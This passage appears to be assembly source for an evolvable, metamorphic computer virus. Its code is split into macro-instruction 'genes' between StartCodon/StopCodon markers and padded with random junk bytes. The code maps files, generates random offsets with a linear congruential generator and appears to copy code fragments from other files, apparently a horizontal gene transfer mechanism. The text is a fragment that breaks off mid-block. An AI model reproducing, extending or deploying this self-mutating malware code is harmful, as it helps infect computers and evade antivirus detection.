db 39
db 220
db 26
db 177
db 147
db 169
db 140
db 220
db 1
db 220
db 24
db 159
db 230
db 2
db 61
db 127
db 10
db 179
db 30
db 246
db 16
db 242
db 85
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
               _push   ; 0
db StopCodon
db 75
db 187
db 72
db 181
db 75
db 213
db 135
db 192
db 170
db 253
db 109
db 220
db 54
db 79
db 55
db 39
db 144
db 197
db 180
db 131
db 73
db 20
db 228
db 212
db StartCodon
               _push   ; 0
    BigNum=2
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
db StopCodon
db 177
db 75
db 111
db 154
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
               _addsaved
               _push   ; MapHandle
    _getDO
    BigNum=hMapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 163
db 225
db 29
db 153
db 191
db 218
db 0
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=HGTMapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 182
db 225
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 184
db 112
db 159
db 81
db 243
db 1
db 106
db 75
db 107
db 92
db 103
db 123
db 118
db 101
db 168
db 188
db 133
db 187
db 102
db 96
db StartCodon
        _popall                 ; restore all registers
db StopCodon
db 201
db 29
db 24
db 135
db 62
db 122
db 71
db 141
db 90
db 114
db 193
db 210
db 105
db 205
db 211
db 194
db 122
db 57
db 144
db 41
db 198
db 131
db 25
db 92
db 104
db 206
db 117
db 90
db 157
db 20
db 207
db 169
db 244
db 239
db 3
db 238
db 78
db 13
db 249
db 198
db 89
db 71
db 225
db 103
db 83
db 116
db 179
db 134
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 213
db 148
db 255
db 117
db 121
db 111
db 124
db 19
db 114
db StartCodon
        _save
        _and
        _popall
    end if
               _saveWrtOff
               _nopsA
db StopCodon
db StartCodon
               _writeDWord              ; mov dword[HGTMapPointer], RegA
               _nopsA
               _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
               _and
               _JnzDown         ; Simulate a JzDown
                       _pop     ; BC1=0
                       _push
                       _call    ; If NULL -> Do not open...
                       _nopREAL
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 70
db 124
db 105
db 85
db 21
db 125
db 67
db 181
db 159
db 120
db 125
db 71
db 53
db 116
db 117
db 72
db 212
db 212
db 45
db 71
db 15
db 124
db 164
db 233
db 252
db 108
db 93
db 172
db 228
db 122
db 10
db 141
db 175
db 201
db 94
db 122
db 172
db 77
db 153
db 7
db 82
db 112
db 187
db 29
db 181
db 100
db 95
db 162
db 170
db 210
db 247
db 43
db 196
db 87
db 85
db 208
db 155
db 225
db 67
db 238
db 168
db 225
db 145
db 76
db 163
db 195
db 188
db 32
db 226
db 33
db 108
db 158
db 165
db 53
db 101
db 44
db 254
db 124
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 151
db 240
db 20
db 57
db 45
db 75
db 102
db 240
db 110
db 167
db 241
db 127
db 133
db 153
db 38
db 1
db 31
db 138
db 5
db 205
db 203
db 252
db 53
db 4
db 244
db 57
db 113
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 3
db 105
db 165
db 181
db 71
db 242
db 162
db 27
db 181
db 245
db 184
db 225
db 6
db 242
db 141
db 210
db 31
db 146
db 178
db 201
db 59
db 56
db 114
db 137
db 30
db 64
db 5
db 105
db 178
db 227
db 55
db 180
db 88
db 101
db 78
db 124
db 186
db 40
db 249
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 34
db 56
db 253
db 192
db 214
db 82
db 117
db 191
db 44
db 149
db 62
db 102
db 158
db 206
db 230
db 4
db 111
db 36
db 96
db 111
db 214
db 16
db 204
db 203
db 63
db 175
db 20
db 182
db 211
db 117
db 252
db 171
db 206
db 68
db 211
db 137
db 113
db 146
db 34
db 90
db 46
db 131
db 159
db 208
db 147
db 154
db 134
db 77
db 221
db 5
db 54
db 252
db 175
db 215
db 212
db 91
db 101
db 111
db 225
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 27
db 221
db 48
db 199
db 24
db 231
db 73
db 33
db 64
db 96
db 233
db 205
db 57
db 93
db 2
db 7
db 140
db 6
db 131
db 153
db 49
db 195
db 42
db 170
db 255
db 128
db 233
db 45
db 193
db 8
db 202
db 29
db 163
db 59
db 107
db 98
db 66
db 148
db 130
db 206
db 3
db 95
db 218
db 154
db 32
db 42
db 156
db 25
db 49
db 208
db 19
db 138
db 94
db 56
db 201
db 108
db 148
db 10
db 103
db 239
db 129
db 137
db 102
db 131
db 68
db 53
db 216
db 110
db 117
db 75
db 55
db 212
db 130
db 182
db 201
db 165
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 134
db 219
db 2
db 184
db 27
db 82
db 130
db 151
db 11
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 168
db 166
db 90
db 12
db 95
db 146
db 210
db 38
db 158
db 157
db 124
db 17
db 185
db 8
db 224
db 210
db 212
db 204
db 33
db 123
db 232
db 88
db 193
db 99
db 206
db 31
db 176
db 53
db 89
db 229
db 188
db 176
db 109
db 236
db 231
db 32
db 47
db 230
db 136
db 210
db 53
db 58
db 182
db 203
db 38
db 28
db 146
db 54
db 67
db 238
db 115
db 234
db 160
db 155
db 252
db 186
db 235
db 199
db 246
db 126
db 169
db 203
db 154
db 188
db 61
db 21
db 12
db 19
db 19
db 255
db 147
db 142
db 10
db 133
db 3
db 235
db 169
db 235
db 4
db 240
db 96
db 82
db 81
db 4
db 92
db 188
db 108
db 202
db 114
db 132
db 59
db 6
db 72
db 210
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 162
db 168
db 209
db 3
db 77
db 178
db 56
db 108
db 8
db 109
db 23
db 198
db 223
db 207
db 59
db 170
db 112
db 105
db 87
db 174
db 112
db 27
db 35
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA
db StopCodon
db 224
db 130
db 14
db 150
db 34
db 82
db 65
db 70
db 240
db 185
db 13
db 59
db 209
db 25
db 38
db 90
db 71
db 87
db 55
db 182
db 232
db 151
db 82
db 192
db 169
db 43
db 165
db 68
db 42
db 185
db 26
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _nopdD
    _getDO
    BigNum=HGTFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _div
               _nopsD
               _save
    _getDO
    BigNum=HGTMapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 36
db 231
db 212
db 107
db 240
db 4
db 50
db 23
db 99
db 239
db 20
db 5
db 90
db 37
db 123
db 50
db 253
db 170
db 182
db 83
db 221
db 24
db 7
db 139
db 22
db 202
db 138
db 172
db 224
db 28
db 132
db 64
db 54
db 10
db 75
db 135
db 98
db 46
db 211
db 206
db 17
db 41
db 175
db 206
db 233
db 219
db 90
db 6
db 120
db 71
db 133
db 138
db 97
db 24
db 50
db 117
db 127
db 45
db 104
db 244
db 143
db 120
db 179
db 128
db 182
db 7
db 143
db 201
db 187
db 254
db 251
db 99
db 139
db 214
db 120
db 242
db 165
db 22
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 150
db 212
db 45
db 138
db 191
db 148
db 56
db 218
db 121
db 188
db 22
db 28
db 160
db 212
db 47
db 144
db 92
db 101
db 234
db 227
db 229
db 16
db 6
db 5
db 222
db 57
db 234
db 38
db 27
db 65
db 94
db 172
db 15
db 146
db 211
db 173
db 86
db 190
db 63
db 169
db 165
db 23
db 128
db 22
db 149
db 223
db 245
db 68
db 36
db 132
db 156
db 110
db 223
db 39
db 50
db 140
db 83
db 207
db 109
db 94
db 136
db 115
db 31
db 108
db 29
db 66
db 89
db 171
db 171
db 51
db 119
db 143
db 11
db 69
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 210
db 53
db 122
db 241
db 24
db 15
db 109
db 165
db 5
db 223
db 201
db 158
db 234
db 107
db 230
db 177
db 81
db 233
db 197
db 112
db 131
db 137
db 137
db 217
db 43
db 232
db 67
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _addsaved
               _push                ; Start in sourcefile
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 163
db 31
db 123
db 21
db 43
db 73
db 193
db 214
db 197
db 168
db 155
db 52
db 93
db 215
db 201
db 114
db 158
db 163
db 244
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 191
db 98
db 137
db 124
db 88
db 13
db 46
db 100
db 155
db 79
db 253
db 162
db 196
db 204
db 214
db 24
db 250
db 108
db 61
db 160
db 14
db 33
db 36
db 133
db 74
db 188
db 91
db 90
db 240
db 84
db 210
db 94
db 232
db 33
db 197
db 47
db 84
db 87
db 252
db 190
db 205
db 26
db 49
db 113
db 161
db 55
db 148
db 137
db 149
db 52
db 244
db 146
db 146
db 227
db 217
db 106
db 102
db 35
db 250
db 4
db 119
db 95
db 98
db 88
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 65
db 247
db 179
db 219
db 97
db 195
db 93
db 106
db 197
db 206
db 88
db 40
db 109
db 117
db 59
db 227
db 106
db 175
db 141
db 73
db 250
db 228
db 109
db 1
db 88
db 193
db 112
db 119
db 101
db 209
db 215
db 108
db 117
db 189
db 54
db 230
db 63
db 137
db 20
db 36
db 65
db 192
db 46
db 202
db 144
db 163
db 103
db 78
db 90
db 54
db 123
db 85
db 219
db 144
db 60
db 19
db 230
db 0
db 76
db 22
db 177
db 216
db 85
db 36
db 61
db 126
db 3
db 57
db 254
db 241
db 76
db 151
db 89
db 98
db 127
db 170
db 41
db 232
db 84
db 5
db 156
db StartCodon
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 243
db 79
db 252
db 190
db 170
db 94
db 130
db 17
db 127
db 42
db 39
db 63
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _nopdD
    _getDO
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 97
db 62
db 154
db 7
db 109
db 229
db 15
db 0
db 151
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
